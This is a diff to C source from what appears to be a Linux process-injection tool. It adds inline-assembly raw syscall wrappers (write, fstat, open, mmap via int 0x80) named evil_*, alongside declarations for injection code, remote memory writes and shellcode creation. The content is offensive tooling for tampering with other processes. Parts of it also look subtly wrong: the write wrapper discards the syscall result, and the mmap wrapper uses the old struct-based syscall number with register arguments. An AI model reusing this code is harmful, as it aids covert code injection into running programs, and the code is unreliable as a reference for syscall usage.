@@ -33,7 +33,7 @@ typedef struct handle
     struct user_regs_struct pt_reg;
 } handle_t;
 
-static inline volatile void* evil_map(void *, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t) __attribute__((aligned(8), __always_inline__));
+static inline volatile void* evil_map(void *, size_t, int, int, int, off_t) __attribute__((aligned(8), __always_inline__));
 uint32_t injection_code(void *) __attribute__((aligned(8)));
 uint32_t get_text_base(pid_t);
 int pid_write(int, void *, const void *, size_t);
@@ -42,29 +42,66 @@ char* create_fn_shellcode(void (*fn)(), size_t len);
 void* f1 = injection_code;
 void* f2 = get_text_base;
 
-static inline volatile long evil_write(long fd, char* buf, unsigned long len)
+static inline volatile int evil_write(int fd, char* buf, size_t len)
 {
-    long ret;
+    int ret;
     __asm__ volatile(
-
-            );
+            "movl $4, %%eax\n"
+            "movl %0, %%ebx\n"
+            "movl %1, %%ecx\n"
+            "movl %2, %%edx\n"
+            "int $0x80" : : "g"(fd), "g"(buf), "g"(len));
     asm("movl $0, %%eax \n" : "=r"(ret));
     return ret;
 }
 
-static inline volatile int evil_fstat(long fd, struct stat* buf)
+static inline volatile int evil_fstat(int fd, struct stat* buf)
 {
+    int ret;
 
+    __asm__ volatile (
+            "movl $108, %%eax\n"
+            "movl %0, %%ebx\n"
+            "movl %1, %%ecx\n"
+            "int $0x80" : : "g"(fd), "g"(buf));
+    __asm__ volatile (
+            "movl %%eax, %0\n" : "=r"(ret));
+    return ret;
 }
 
-static inline volatile int evil_open(const char* path, unsigned long flags)
+static inline volatile int evil_open(const char* path, int flags)
 {
+    int ret;
 
+    __asm__ volatile (
+            "movl $5, %%eax\n"
+            "movl %0, %%ebx\n"
+            "movl %1, %%ecx\n"
+            "int $0x80" : : "g"(path), "g"(flags));
+    __asm__ volatile (
+            "movl %%eax, %0\n" : "=r"(ret));
+    return ret;
 }
 
-static inline volatile void* evil_mmap(void* addr, uint32_t len, uint32_t prot, uint32_t flags, uint32_t fd, uint32_t off)
+static inline volatile void* evil_mmap(void* addr, size_t len, int prot, int flags, int fd, off_t offset)
 {
+    int ret;
 
+    int mmap_fd = fd;
+    off_t mmap_offset = offset;
+    int mmap_flags = flags;
+
+    __asm__ volatile (
+            "movl $90, %%eax\n"
+            "movl %0, %%ebx\n"
+            "movl %1, %%ecx\n"
+            "movl %2, %%edx\n"
+            "movl %3, %%esi\n"
+            "movl %4, %%edi\n"
+            "movl %5, %%ebp\n"
+            "int $0x80" : : "g"(addr), "g"(len), "g"(prot), "g"(mmap_flags), "g"(mmap_fd), "g"(mmap_offset));
+    __asm__ volatile (
+            "movl %%eax, %0\n" : "=r"(ret));
     return (void *)ret;
 }
 
